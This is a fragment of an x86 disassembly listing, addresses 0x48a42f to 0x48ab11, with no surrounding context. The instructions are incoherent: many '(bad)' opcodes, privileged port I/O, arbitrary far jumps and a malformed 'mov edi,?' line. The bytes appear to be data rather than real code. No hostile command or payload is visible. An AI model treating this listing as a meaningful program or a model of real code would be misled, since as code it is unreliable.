  48a42f:	out    0xb7,eax
  48a431:	inc    ebp
  48a432:	bound  ebx,QWORD PTR [ebp-0x3068a9e0]
  48a438:	mov    gs,WORD PTR ds:0x3b6f2e24
  48a43e:	or     ebx,esi
  48a440:	jmp    0xc2a:0x37735714
  48a447:	mov    bh,0x92
  48a449:	inc    ebp
  48a44a:	cmp    edi,edi
  48a44c:	mov    ah,0x1
  48a44e:	push   esi
  48a44f:	mov    ebx,0xc7465744
  48a454:	(bad)  
  48a455:	shr    DWORD PTR [ecx+eiz*2],0xf7
  48a459:	dec    edi
  48a45a:	adc    BYTE PTR [ebx],ch
  48a45c:	fcom   DWORD PTR [edi+0x4f]
  48a45f:	pop    ds
  48a460:	sub    eax,0xef8c9884
  48a465:	ins    DWORD PTR es:[edi],dx
  48a466:	(bad)  
  48a467:	mov    dh,0x1a
  48a469:	(bad)  
  48a46a:	aas    
  48a46b:	sbb    ebp,DWORD PTR [edi]
  48a46d:	and    ah,BYTE PTR ds:0x318e588d
  48a473:	or     al,0x60
  48a475:	shl    BYTE PTR [eax],1
  48a477:	das    
  48a478:	adc    ecx,DWORD PTR [ebx]
  48a47a:	lods   eax,DWORD PTR ds:[esi]
  48a47b:	push   ecx
  48a47c:	jg     0xae0f01ca
  48a482:	jg     0x48a4ce
  48a484:	ja     0x48a48e
  48a486:	add    eax,0xd74f4418
  48a48b:	inc    esi
  48a48c:	test   BYTE PTR ds:0x20b72fd2,dh
  48a492:	(bad)  
  48a493:	pop    esi
  48a494:	sbb    bl,BYTE PTR [edi]
  48a496:	ja     0x48a45f
  48a498:	and    DWORD PTR [esi-0x16],ebp
  48a49b:	test   al,0x87
  48a49d:	inc    esp
  48a49e:	out    dx,eax
  48a49f:	add    eax,0x8700158d
  48a4a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48a4a5:	adc    eax,0x364750ac
  48a4aa:	aaa    
  48a4ab:	pop    es
  48a4ac:	ret    0xa41a
  48a4af:	mov    ch,0x97
  48a4b1:	jg     0x48a43d
  48a4b3:	sub    al,0xac
  48a4b5:	retf   0xc7c7
  48a4b8:	add    al,0xc2
  48a4ba:	xlat   BYTE PTR ds:[ebx]
  48a4bb:	pop    edx
  48a4bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48a4bd:	xor    ecx,DWORD PTR [edi+0x16d8da30]
  48a4c3:	inc    ebx
  48a4c4:	aas    
  48a4c5:	mov    ds:0x5a4ba8d6,eax
  48a4ca:	pop    es
  48a4cb:	addr16 pop eax
  48a4cd:	and    esp,DWORD PTR [esp+edx*1+0x556ae38f]
  48a4d4:	or     BYTE PTR [edi+0x17],bl
  48a4d7:	mov    al,ds:0x57312ef1
  48a4dc:	pop    esi
  48a4dd:	inc    edi
  48a4de:	popa   
  48a4df:	or     eax,0x3846792b
  48a4e4:	xchg   edi,eax
  48a4e5:	jnp    0x48a493
  48a4e7:	shl    DWORD PTR [ecx+0x43afaf0f],1
  48a4ed:	xchg   DWORD PTR [ebp+0x24],eax
  48a4f0:	mov    dl,BYTE PTR [ebp+0x1f]
  48a4f3:	xor    BYTE PTR [edx],bl
  48a4f5:	outs   dx,BYTE PTR ds:[esi]
  48a4f6:	shl    DWORD PTR [edi+0xa],0x87
  48a4fa:	stos   BYTE PTR es:[edi],al
  48a4fb:	xor    BYTE PTR [esi-0x10],dl
  48a4fe:	add    DWORD PTR [edi],0xffffff87
  48a501:	sbb    BYTE PTR [ebp+0x30],al
  48a504:	shl    edi,0x41
  48a507:	(bad)  
  48a509:	sub    BYTE PTR [ebp+0x482bb7c9],ch
  48a50f:	shl    BYTE PTR [eax],0x94
  48a512:	inc    edi
  48a513:	mov    al,0x60
  48a515:	add    eax,0x5707ff8b
  48a51a:	push   eax
  48a51b:	les    esp,FWORD PTR [eax+0x3ac1d796]
  48a521:	dec    ebp
  48a522:	lods   al,BYTE PTR ds:[esi]
  48a523:	iret   
  48a524:	fbld   TBYTE PTR [edi]
  48a526:	sbb    ah,cl
  48a528:	add    BYTE PTR [edx],dl
  48a52a:	sub    edx,eax
  48a52c:	dec    eax
  48a52d:	push   ds
  48a52e:	test   al,0xaf
  48a530:	xor    DWORD PTR [eax],eax
  48a532:	cmp    DWORD PTR [eax+0x44],ebx
  48a535:	pop    es
  48a536:	xchg   esp,eax
  48a537:	jg     0x48a570
  48a539:	inc    edi
  48a53a:	adc    eax,0xe7d8ad7a
  48a53f:	push   ds
  48a540:	xlat   BYTE PTR ds:[ebx]
  48a541:	dec    edi
  48a542:	inc    eax
  48a543:	sub    BYTE PTR [edx-0x11],ah
  48a546:	inc    ebx
  48a547:	add    BYTE PTR [ecx+ebp*1+0x14],al
  48a54b:	and    BYTE PTR [edi+eax*2],ah
  48a54e:	jmp    0x7b2d19d
  48a553:	ja     0x48a598
  48a555:	mov    esi,0x17adc226
  48a55a:	xchg   DWORD PTR [edi+0x39],ebp
  48a55d:	add    BYTE PTR [edx+ebx*2],dh
  48a560:	popf   
  48a561:	push   esp
  48a562:	dec    eax
  48a563:	dec    edi
  48a564:	push   es
  48a565:	outs   dx,BYTE PTR ds:[esi]
  48a566:	push   ebp
  48a567:	or     BYTE PTR [edi+0xa],0x5c
  48a56b:	pop    ebp
  48a56c:	inc    esi
  48a56d:	sub    BYTE PTR [edi-0x7be5cbb9],bl
  48a573:	mov    esi,DWORD PTR [ebp-0x71]
  48a576:	out    0x3f,eax
  48a578:	pop    edx
  48a579:	stos   DWORD PTR es:[edi],eax
  48a57a:	adc    edx,DWORD PTR [edi+0x6b8d078e]
  48a580:	and    dl,BYTE PTR [ecx]
  48a582:	jmp    DWORD PTR [edi]
  48a584:	push   edi
  48a585:	cs loop 0x48a5a2
  48a588:	(bad)  
  48a58a:	(bad)  
  48a58b:	aas    
  48a58c:	shl    BYTE PTR [ebp-0x5970a7fd],cl
  48a592:	adc    DWORD PTR [esi],ecx
  48a594:	xchg   esp,eax
  48a595:	sub    bh,ch
  48a597:	jae    0x48a618
  48a599:	push   0x1ec2392c
  48a59e:	inc    esp
  48a59f:	fsub   DWORD PTR [ebp+0x2b]
  48a5a2:	aad    0x47
  48a5a4:	lahf   
  48a5a5:	lods   al,BYTE PTR ds:[esi]
  48a5a6:	imul   esi,DWORD PTR [ecx+0x50],0x1f
  48a5aa:	pop    DWORD PTR [eax-0x409d28ef]
  48a5b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48a5b1:	inc    eax
  48a5b2:	or     al,0xd8
  48a5b4:	(bad)  
  48a5b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48a5b6:	dec    edi
  48a5b7:	xchg   DWORD PTR [eax-0x3b],ebx
  48a5ba:	call   0x5612:0xcd178780
  48a5c1:	inc    ecx
  48a5c2:	xchg   edi,eax
  48a5c3:	inc    edi
  48a5c4:	add    BYTE PTR [ecx-0x40],ch
  48a5c7:	xor    dh,BYTE PTR [edi]
  48a5c9:	dec    edi
  48a5ca:	leave  
  48a5cb:	push   ebp
  48a5cc:	pop    ebx
  48a5cd:	mov    edi,esi
  48a5cf:	mov    edi,0x20d0a846
  48a5d4:	push   0x5a58118f
  48a5d9:	mov    ds:0x21c44767,eax
  48a5de:	ins    BYTE PTR es:[edi],dx
  48a5df:	pop    eax
  48a5e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48a5e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48a5e2:	push   0x30
  48a5e4:	push   ds
  48a5e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48a5e6:	jecxz  0x48a5bf
  48a5e8:	and    DWORD PTR gs:[ecx-0x1d],edx
  48a5ec:	inc    esi
  48a5ed:	pop    edi
  48a5ee:	leave  
  48a5ef:	push   eax
  48a5f0:	add    al,bh
  48a5f2:	(bad)  
  48a5f3:	xor    edi,edi
  48a5f5:	xor    al,0xca
  48a5f7:	push   esp
  48a5f8:	imul   esp,DWORD PTR [ecx-0x11],0x75c6aa45
  48a5ff:	add    dl,BYTE PTR [edi+0x44835735]
  48a605:	xchg   ebp,eax
  48a606:	mov    ah,0xc7
  48a608:	xchg   DWORD PTR [edx-0x78],edx
  48a60b:	add    BYTE PTR [esi+eax*2+0x17],al
  48a60f:	ret    0xe32a
  48a612:	ret    
  48a613:	inc    edi
  48a614:	dec    edi
  48a615:	arpl   bp,dx
  48a617:	sbb    BYTE PTR [ebp-0x11],dl
  48a61a:	aaa    
  48a61b:	call   0xd9ff:0xa76d55a4
  48a622:	sbb    ch,BYTE PTR cs:[ebx-0x52f2a45d]
  48a629:	inc    ecx
  48a62a:	jp     0x48a62b
  48a62c:	mov    bh,0xde
  48a62e:	sub    dl,al
  48a630:	push   eax
  48a631:	inc    edi
  48a632:	inc    ebx
  48a633:	out    0x33,eax
  48a635:	or     ah,BYTE PTR [ebx+edi*2+0x7dacb86]
  48a63c:	push   ss
  48a63d:	bound  edx,QWORD PTR [ecx+esi*4]
  48a640:	aaa    
  48a641:	sbb    ecx,DWORD PTR [ebp-0x44]
  48a644:	pop    ebp
  48a645:	inc    edx
  48a646:	push   edi
  48a647:	jmp    DWORD PTR [ecx-0x58bbddd9]
  48a64d:	xlat   BYTE PTR ds:[ebx]
  48a64e:	rol    edx,0x11
  48a651:	mov    bl,0x97
  48a653:	xor    esp,DWORD PTR [ecx+0x39]
  48a656:	push   eax
  48a657:	adc    bh,0xee
  48a65a:	inc    esp
  48a65b:	lds    edi,FWORD PTR [esi+0xfd3b171]
  48a661:	repz push edi
  48a663:	(bad)  
  48a664:	popa   
  48a665:	imul   ecx,ecx,0x30
  48a668:	aas    
  48a669:	pop    ebp
  48a66a:	shl    BYTE PTR [ebp+0x27375bae],cl
  48a670:	jbe    0x48a68c
  48a672:	shl    BYTE PTR [eax],0xb2
  48a675:	and    edi,DWORD PTR [ecx]
  48a677:	push   esi
  48a678:	ret    
  48a679:	xor    eax,0x6e0b377f
  48a67e:	xchg   BYTE PTR [ecx+0x33871752],dh
  48a684:	push   esi
  48a685:	sub    BYTE PTR ds:0x4ec7cfb4,ch
  48a68b:	ins    BYTE PTR es:[edi],dx
  48a68c:	jmp    0x9f7fee11
  48a691:	sub    al,0x69
  48a693:	aaa    
  48a694:	es xor ebp,edi
  48a697:	mov    ch,0x63
  48a699:	or     eax,0xcb7f1b5a
  48a69e:	lods   eax,DWORD PTR ds:[esi]
  48a69f:	ins    DWORD PTR es:[edi],dx
  48a6a0:	mov    dh,0xd2
  48a6a2:	not    DWORD PTR [edi+0x1edb9cd7]
  48a6a8:	jecxz  0x48a661
  48a6aa:	(bad)  
  48a6ab:	xor    dl,BYTE PTR [edi]
  48a6ad:	mov    edi,DWORD PTR [esi+0x58]
  48a6b0:	nop
  48a6b1:	or     al,BYTE PTR [edi+ecx*8]
  48a6b4:	xchg   DWORD PTR [esi],esp
  48a6b6:	push   es
  48a6b7:	lods   eax,DWORD PTR ds:[esi]
  48a6b8:	shl    BYTE PTR [edi+0x10803157],0x44
  48a6bf:	xchg   BYTE PTR [edi+0x56],dl
  48a6c2:	adc    DWORD PTR [esi+0x13],0x77
  48a6c6:	xchg   edi,eax
  48a6c7:	or     eax,esp
  48a6c9:	cmp    eax,0xcf463fcc
  48a6ce:	repz jne 0x48a6e2
  48a6d1:	sub    ebx,DWORD PTR [edx+0x3b]
  48a6d4:	daa    
  48a6d5:	dec    DWORD PTR [ebp-0x14e9cdeb]
  48a6db:	(bad)  
  48a6dc:	mov    al,ds:0x34a7dc84
  48a6e1:	out    dx,eax
  48a6e2:	xchg   BYTE PTR [esi-0x6c],al
  48a6e5:	xor    bh,BYTE PTR [edi+0x62b09d0c]
  48a6eb:	outs   dx,DWORD PTR ds:[esi]
  48a6ec:	out    dx,al
  48a6ed:	pop    eax
  48a6ee:	imul   esp,DWORD PTR [ecx-0x2b],0x1aad37af
  48a6f5:	mov    ecx,DWORD PTR [ecx]
  48a6f7:	(bad)  
  48a6f8:	push   DWORD PTR [eax]
  48a6fa:	push   esp
  48a6fb:	lods   al,BYTE PTR ds:[esi]
  48a6fc:	or     ah,bh
  48a6fe:	pop    ss
  48a6ff:	xor    dl,BYTE PTR [edx+0x35]
  48a702:	es cmp eax,0x26af4327
  48a708:	inc    edi
  48a709:	test   edx,edx
  48a70b:	aaa    
  48a70c:	mov    bh,0x46
  48a70e:	dec    eax
  48a70f:	dec    esp
  48a710:	sbb    al,0x24
  48a712:	out    dx,eax
  48a713:	ss jmp 0x1f12:0xc7c42e96
  48a71b:	push   es
  48a71c:	cmp    eax,0xdf534001
  48a721:	outs   dx,BYTE PTR ds:[esi]
  48a722:	mov    cl,0x49
  48a724:	scas   al,BYTE PTR es:[edi]
  48a725:	xor    BYTE PTR [edx],dh
  48a727:	scas   eax,DWORD PTR es:[edi]
  48a728:	outs   dx,BYTE PTR ds:[esi]
  48a729:	in     eax,dx
  48a72a:	push   0x16
  48a72c:	push   ds
  48a72d:	xlat   BYTE PTR ds:[ebx]
  48a72e:	pop    ds
  48a72f:	xor    DWORD PTR [edi+0x55],edx
  48a732:	pop    ebx
  48a733:	cwde   
  48a734:	pop    esp
  48a735:	inc    ebp
  48a736:	div    DWORD PTR ds:0xff8dc168
  48a73c:	jmp    FWORD PTR [edx-0x784a7c58]
  48a742:	and    edx,DWORD PTR [edi]
  48a744:	jo     0x48a748
  48a746:	push   edi
  48a747:	mov    ebx,0x2f41df34
  48a74c:	cmp    dh,BYTE PTR ds:0x57393639
  48a752:	xor    edx,DWORD PTR [edi]
  48a754:	mov    ecx,DWORD PTR [edx-0x14]
  48a757:	mov    BYTE PTR [edi+0x2f],0xc5
  48a75b:	mov    al,ds:0xc738a0c4
  48a760:	scas   eax,DWORD PTR es:[edi]
  48a761:	xor    al,0x4e
  48a763:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48a764:	mov    bh,BYTE PTR [edi]
  48a766:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48a767:	sbb    BYTE PTR ds:0x1fbf5200,al
  48a76d:	aam    0xa0
  48a76f:	jae    0x48a7ce
  48a771:	inc    edi
  48a772:	cmp    bh,ch
  48a774:	xor    ah,BYTE PTR [eax]
  48a776:	inc    ebx
  48a777:	leave  
  48a778:	inc    ebx
  48a779:	inc    ebp
  48a77a:	cmp    BYTE PTR [ebx+0x37012ab6],cl
  48a780:	xchg   edi,eax
  48a781:	or     esp,esp
  48a783:	add    BYTE PTR [ecx-0x11],0x43
  48a787:	popf   
  48a788:	push   esp
  48a789:	and    ah,ah
  48a78b:	inc    ebx
  48a78c:	add    BYTE PTR [ecx],dh
  48a78e:	jg     0x48a720
  48a790:	jl     0x48a7e3
  48a792:	arpl   WORD PTR [edi+0x31],cx
  48a795:	add    BYTE PTR [ebx-0x2b],al
  48a798:	sub    dl,al
  48a79a:	sub    esi,edi
  48a79c:	pop    ss
  48a79d:	icebp  
  48a79e:	test   DWORD PTR [ecx],eax
  48a7a0:	aad    0x34
  48a7a2:	xchg   edi,eax
  48a7a3:	cli    
  48a7a4:	inc    esp
  48a7a5:	inc    esi
  48a7a6:	shr    DWORD PTR [edx],cl
  48a7a8:	mov    dh,0x37
  48a7aa:	das    
  48a7ab:	shl    ah,1
  48a7ad:	pusha  
  48a7ae:	cmp    edx,DWORD PTR [ebx+0x13c45b7]
  48a7b4:	mov    ds:0x3533afd8,eax
  48a7b9:	lods   al,BYTE PTR ds:[esi]
  48a7ba:	mov    BYTE PTR [ebp-0x19],ch
  48a7bd:	scas   eax,DWORD PTR es:[edi]
  48a7be:	xor    dl,dh
  48a7c0:	pusha  
  48a7c1:	bound  esp,QWORD PTR [edi-0x629f5cf8]
  48a7c7:	(bad)  
  48a7c8:	mov    cl,BYTE PTR [si-0x5f]
  48a7cc:	fdiv   DWORD PTR [edx-0x49]
  48a7cf:	aas    
  48a7d0:	addr16 xchg ebp,eax
  48a7d2:	ss push esi
  48a7d4:	lds    ecx,FWORD PTR [edi-0x29]
  48a7d7:	je     0x48a785
  48a7d9:	ret    0xb786
  48a7dc:	out    dx,eax
  48a7dd:	pop    ds
  48a7de:	retf   
  48a7df:	mov    edx,0x378e68a4
  48a7e4:	ss push 0x24
  48a7e7:	jns    0x48a771
  48a7e9:	pop    es
  48a7ea:	xor    DWORD PTR [eax],eax
  48a7ec:	inc    esp
  48a7ed:	pop    es
  48a7ee:	push   0x5fc052ad
  48a7f3:	pop    edx
  48a7f4:	cmp    al,BYTE PTR [esi+0xdeb1f56]
  48a7fa:	sub    al,0x58
  48a7fc:	adc    BYTE PTR [edi],dh
  48a7fe:	pop    es
  48a7ff:	xchg   BYTE PTR [edi+0x8],al
  48a802:	push   ebp
  48a803:	aas    
  48a804:	mov    edi,0x22c47743
  48a809:	les    ebp,FWORD PTR [eax]
  48a80b:	xchg   DWORD PTR [edx-0x4053b14c],ebx
  48a811:	pop    ss
  48a812:	pop    edi
  48a813:	bound  ecx,QWORD PTR [ebp-0x55]
  48a816:	ror    bh,1
  48a818:	mov    edi,0x5d2ad00d
  48a81d:	jae    0x48a7ee
  48a81f:	mov    edi,0x58408908
  48a824:	les    ecx,FWORD PTR [di]
  48a827:	imul   edx,DWORD PTR [ecx],0x392473f
  48a82d:	jge    0x48a890
  48a82f:	or     DWORD PTR [esi+0x4c55f234],0x24
  48a836:	inc    DWORD PTR [esi+0x0]
  48a839:	xor    al,0x5
  48a83b:	pop    eax
  48a83c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48a83d:	push   eax
  48a83e:	pop    DWORD PTR [edi+0x11]
  48a841:	pusha  
  48a842:	adc    DWORD PTR [esi-0x71],0x81168527
  48a849:	push   es
  48a84a:	(bad)  
  48a84b:	pop    DWORD PTR [eax+0xb]
  48a84e:	push   edx
  48a84f:	jb     0x48a889
  48a851:	pop    es
  48a852:	inc    edx
  48a853:	mov    DWORD PTR [eax+ebp*4-0x71],esp
  48a857:	inc    ebx
  48a858:	dec    ebx
  48a859:	inc    eax
  48a85a:	add    BYTE PTR [ebx+0x27],0x2f
  48a85e:	xchg   edi,eax
  48a85f:	and    ch,BYTE PTR [eax+0x14]
  48a862:	pusha  
  48a863:	inc    edi
  48a864:	fild   QWORD PTR [esi-0x3553d0c0]
  48a86a:	(bad)  
  48a86b:	cmp    BYTE PTR [edx-0x60],dh
  48a86e:	ins    DWORD PTR es:[edi],dx
  48a86f:	dec    edx
  48a870:	xor    edi,eax
  48a872:	mov    es,WORD PTR [ebx-0x60]
  48a875:	inc    edx
  48a876:	xchg   DWORD PTR [edx+esi*4],eax
  48a879:	pop    DWORD PTR [edi-0x54]
  48a87c:	enter  0xa742,0xbf
  48a880:	dec    esp
  48a881:	adc    eax,0x8f42d028
  48a886:	add    eax,DWORD PTR [ebp+0x31]
  48a889:	adc    BYTE PTR [edx+0x12879741],ch
  48a88f:	mov    eax,ds:0x8f420740
  48a894:	adc    eax,DWORD PTR [eax]
  48a896:	scas   al,BYTE PTR es:[edi]
  48a897:	inc    edx
  48a898:	(bad)  
  48a899:	cmp    BYTE PTR [ebx-0x5eedd1],cl
  48a89f:	fild   WORD PTR [ebx]
  48a8a1:	dec    ebx
  48a8a2:	pop    esp
  48a8a3:	pop    edx
  48a8a4:	mov    edi,?
  48a8a6:	jg     0x48a852
  48a8a8:	popf   
  48a8a9:	pop    eax
  48a8aa:	mov    eax,ds:0x604fc785
  48a8af:	add    DWORD PTR [eax-0x7800d0d4],0x6be374a4
  48a8b9:	(bad)  
  48a8ba:	jnp    0x48a889
  48a8bc:	(bad)  
  48a8bd:	push   0x1757af6f
  48a8c2:	adc    eax,0x37188af2
  48a8c7:	cmp    DWORD PTR [edx],ebx
  48a8c9:	inc    eax
  48a8ca:	ins    BYTE PTR es:[edi],dx
  48a8cb:	sub    edi,esp
  48a8cd:	fiadd  DWORD PTR [ecx+eax*1+0x21]
  48a8d1:	idiv   DWORD PTR [ebx+0x2b170b57]
  48a8d7:	daa    
  48a8d8:	das    
  48a8d9:	jg     0x48a90f
  48a8db:	sub    al,dl
  48a8dd:	and    esp,DWORD PTR [ecx]
  48a8df:	and    esi,DWORD PTR [edi]
  48a8e1:	fcom   QWORD PTR [eax]
  48a8e3:	push   cs
  48a8e4:	stos   DWORD PTR es:[edi],eax
  48a8e5:	cmp    bh,BYTE PTR [edi-0x69]
  48a8e8:	hlt    
  48a8e9:	adc    al,0x52
  48a8eb:	pop    esi
  48a8ec:	aas    
  48a8ed:	push   ebp
  48a8ee:	les    eax,FWORD PTR [edx+0x15370701]
  48a8f4:	xor    DWORD PTR [ecx],eax
  48a8f6:	add    al,BYTE PTR [edi+0x42]
  48a8f9:	aaa    
  48a8fa:	xchg   ebp,eax
  48a8fb:	inc    edx
  48a8fc:	and    ah,BYTE PTR [ebx+eax*2+0x42ac5887]
  48a903:	bound  esi,QWORD PTR [edi]
  48a905:	sub    esp,DWORD PTR [esi]
  48a907:	xor    BYTE PTR [edx],cl
  48a909:	push   ss
  48a90a:	pop    es
  48a90b:	div    DWORD PTR [edx+0x54]
  48a90e:	adc    ebx,ebp
  48a910:	xchg   DWORD PTR [edi],esi
  48a912:	cmp    esp,ebx
  48a914:	pop    ebx
  48a915:	repnz adc BYTE PTR [esi+0x0],al
  48a919:	xor    DWORD PTR [edi+0x52],edx
  48a91c:	xchg   esp,eax
  48a91d:	nop
  48a91e:	mov    cl,BYTE PTR [eax]
  48a920:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48a921:	stos   DWORD PTR es:[edi],eax
  48a922:	push   ss
  48a923:	xchg   edx,eax
  48a924:	mov    esp,0xa55f43df
  48a929:	adc    al,0x8c
  48a92b:	inc    edx
  48a92c:	daa    
  48a92d:	das    
  48a92e:	lods   al,BYTE PTR ds:[esi]
  48a92f:	pop    ebx
  48a930:	ror    BYTE PTR [edx],0x67
  48a933:	out    0x4,eax
  48a935:	and    eax,0xe77714a2
  48a93a:	pusha  
  48a93b:	mov    eax,ds:0x334ef214
  48a940:	stos   BYTE PTR es:[edi],al
  48a941:	push   es
  48a942:	sub    al,dl
  48a944:	sub    eax,DWORD PTR [di-0x39]
  48a948:	mov    edx,DWORD PTR ss:[ecx+0x6f07a8d0]
  48a94f:	sub    BYTE PTR [eax-0x58bb77ab],cl
  48a955:	lahf   
  48a956:	dec    edx
  48a957:	adc    al,0x12
  48a959:	xchg   BYTE PTR [ecx],bh
  48a95b:	lahf   
  48a95c:	inc    edx
  48a95d:	mov    dl,BYTE PTR [esi]
  48a95f:	adc    DWORD PTR [edi-0x7306f6d1],ebx
  48a965:	push   ebp
  48a966:	aas    
  48a967:	pop    edi
  48a968:	cmp    BYTE PTR [ebx+0x47],ch
  48a96b:	fild   DWORD PTR [edx+0x1f5fd337]
  48a971:	pop    edi
  48a972:	shl    BYTE PTR [esi],1
  48a974:	xor    al,0x1b
  48a976:	aas    
  48a977:	aaa    
  48a978:	jg     0x48a9dd
  48a97a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48a97b:	mov    al,0x22
  48a97d:	(bad)  
  48a97e:	es push 0xffffffac
  48a981:	pop    edx
  48a982:	dec    ecx
  48a983:	xor    bl,BYTE PTR [ebx+0x60839297]
  48a989:	xor    BYTE PTR [esi],bl
  48a98b:	aas    
  48a98c:	inc    ecx
  48a98d:	popa   
  48a98e:	test   eax,0xcf38b882
  48a993:	pop    edi
  48a994:	push   ss
  48a995:	push   esi
  48a996:	mov    ah,0x90
  48a998:	cmp    DWORD PTR [edi],esp
  48a99a:	mov    ds:0xb728505b,eax
  48a99f:	mul    DWORD PTR [esi+eax*1+0x3742a0b8]
  48a9a6:	xor    ch,BYTE PTR [ebp+0x5]
  48a9a9:	psubsw mm0,mm7
  48a9ac:	out    dx,eax
  48a9ad:	(bad)  
  48a9ae:	lahf   
  48a9af:	mov    ah,dl
  48a9b1:	dec    ecx
  48a9b2:	popa   
  48a9b3:	(bad)  
  48a9b4:	(bad)  
  48a9b6:	or     bh,BYTE PTR [esi+0x3bc707f3]
  48a9bc:	push   esi
  48a9bd:	add    eax,0x37d777ad
  48a9c2:	pop    ss
  48a9c3:	mov    ah,0xe1
  48a9c5:	sbb    DWORD PTR [ebx-0x11],esp
  48a9c8:	pop    edi
  48a9c9:	ret    0x14e0
  48a9cc:	push   edx
  48a9cd:	(bad)
  48a9d1:	shr    BYTE PTR [edi+0x67],cl
  48a9d4:	add    BYTE PTR [ebp+eiz*2-0x1d],0x36
  48a9d9:	lahf   
  48a9da:	pop    es
  48a9db:	outs   dx,DWORD PTR ds:[esi]
  48a9dc:	mov    cl,0xb0
  48a9de:	(bad)  
  48a9e0:	ja     0x48a9d9
  48a9e2:	or     eax,0x57105421
  48a9e7:	or     dh,dh
  48a9e9:	mov    BYTE PTR [ebp+0x2f],dl
  48a9ec:	mov    bh,0x7f
  48a9ee:	inc    ebx
  48a9ef:	mov    ds:0xb9a742c8,eax
  48a9f4:	sub    BYTE PTR [ebp+0x41cf2f03],ch
  48a9fa:	pop    ebx
  48a9fb:	pop    ebx
  48a9fc:	mov    al,0x2d
  48a9fe:	(bad)  
  48a9ff:	jmp    0x48aa68
  48aa01:	out    dx,eax
  48aa02:	dec    eax
  48aa03:	js     0x48aa2d
  48aa05:	add    eax,0x620d5616
  48aa0a:	adc    edi,edx
  48aa0c:	outs   dx,DWORD PTR ds:[esi]
  48aa0d:	push   ebp
  48aa0e:	sbb    esi,DWORD PTR [edi+0x266f7ff6]
  48aa14:	aaa    
  48aa15:	add    dl,BYTE PTR [ecx]
  48aa17:	das    
  48aa18:	sub    eax,0xac7f47ff
  48aa1d:	sbb    ebp,DWORD PTR es:[ecx]
  48aa20:	jg     0x48a9a5
  48aa22:	pusha  
  48aa23:	adc    eax,0x7575e0b
  48aa28:	adc    eax,0x388d1312
  48aa2d:	pop    es
  48aa2e:	push   DWORD PTR [esi-0x60f94c1c]
  48aa34:	inc    ebp
  48aa35:	aaa    
  48aa36:	ins    BYTE PTR es:[edi],dx
  48aa37:	adc    eax,0xef37e740
  48aa3c:	jg     0x48aa82
  48aa3e:	mov    ah,0x41
  48aa40:	dec    eax
  48aa41:	outs   dx,DWORD PTR ds:[esi]
  48aa42:	aas    
  48aa43:	mov    cl,0xe
  48aa45:	jmp    0x48a9f0
  48aa47:	out    0xbf,al
  48aa49:	mov    WORD PTR [edi+0x2c],es
  48aa4c:	call   0x1718:0x1f6dcf6f
  48aa53:	outs   dx,DWORD PTR ds:[esi]
  48aa54:	pop    ss
  48aa55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48aa56:	push   eax
  48aa57:	pop    eax
  48aa58:	mov    BYTE PTR [ebx+0x31af45ef],ch
  48aa5e:	add    ah,BYTE PTR [eax]
  48aa60:	jno    0x48aad9
  48aa62:	das    
  48aa63:	or     dl,BYTE PTR [ebx]
  48aa65:	mov    ds:0xb8878790,eax
  48aa6a:	dec    ecx
  48aa6b:	sub    al,0xb4
  48aa6d:	mov    dl,0xff
  48aa6f:	adc    DWORD PTR [esi],edx
  48aa71:	mov    bh,0xb0
  48aa73:	mov    bh,0x3e
  48aa75:	and    dl,BYTE PTR [esi]
  48aa77:	xor    dh,BYTE PTR [edi+eax*2+0x2d6eb130]
  48aa7e:	mov    ds:0x97a837af,al
  48aa83:	push   0xbf5f2b25
  48aa88:	sub    eax,0x22ef90c6
  48aa8d:	out    0x36,eax
  48aa8f:	aaa    
  48aa90:	cmp    BYTE PTR [edx-0x50d015cc],0x16
  48aa97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48aa98:	lods   eax,DWORD PTR ds:[esi]
  48aa9a:	je     0x48aa93
  48aa9c:	pop    edi
  48aa9d:	inc    esi
  48aa9e:	sbb    ch,BYTE PTR [edi+0x1d]
  48aaa1:	nop    DWORD PTR [edi]
  48aaa4:	ror    BYTE PTR [edx],1
  48aaa6:	or     eax,0x45c5d784
  48aaab:	pop    esp
  48aaac:	sbb    eax,0x41734b7
  48aab1:	test   eax,0x1f363482
  48aab6:	pop    ds
  48aab7:	sbb    DWORD PTR [ecx+0x44872826],edi
  48aabd:	xor    ecx,DWORD PTR [eax]
  48aabf:	mov    ss,WORD PTR [ecx]
  48aac1:	or     edi,eax
  48aac3:	xor    BYTE PTR [edi],ch
  48aac5:	push   eax
  48aac6:	and    BYTE PTR [eax-0x3f],ah
  48aac9:	pop    es
  48aaca:	ja     0x48aadf
  48aacc:	xor    al,0x30
  48aace:	or     BYTE PTR [ebx+0x2835870e],dl
  48aad4:	leave  
  48aad5:	inc    esp
  48aad6:	xor    cl,BYTE PTR [edi-0x5e75cf80]
  48aadc:	pop    DWORD PTR [ebp+esi*4+0x19]
  48aae0:	stos   DWORD PTR es:[edi],eax
  48aae1:	out    0x7,eax
  48aae3:	mov    edi,0x80701462
  48aae8:	retf   
  48aae9:	scas   eax,DWORD PTR es:[edi]
  48aaea:	ins    BYTE PTR es:[edi],dx
  48aaeb:	add    DWORD PTR [ecx],esp
  48aaed:	adc    edi,esi
  48aaef:	arpl   WORD PTR [eax+0x27],bx
  48aaf2:	push   es
  48aaf3:	shl    DWORD PTR [edi],cl
  48aaf5:	iret   
  48aaf6:	lahf   
  48aaf7:	add    al,0x3c
  48aaf9:	loope  0x48aace
  48aafb:	fwait
  48aafc:	ja     0x48aae9
  48aafe:	and    dh,BYTE PTR [eax+0x40ffbfb8]
  48ab04:	test   al,0x82
  48ab06:	xchg   esi,eax
  48ab07:	inc    esi
  48ab08:	(bad)  
  48ab09:	jl     0x48ab4b
  48ab0b:	pop    edx
  48ab0c:	sub    ah,BYTE PTR [edi]
  48ab0e:	scas   eax,DWORD PTR es:[di]
  48ab10:	inc    ebp
  48ab11:	xor    eax,0x9fe02045
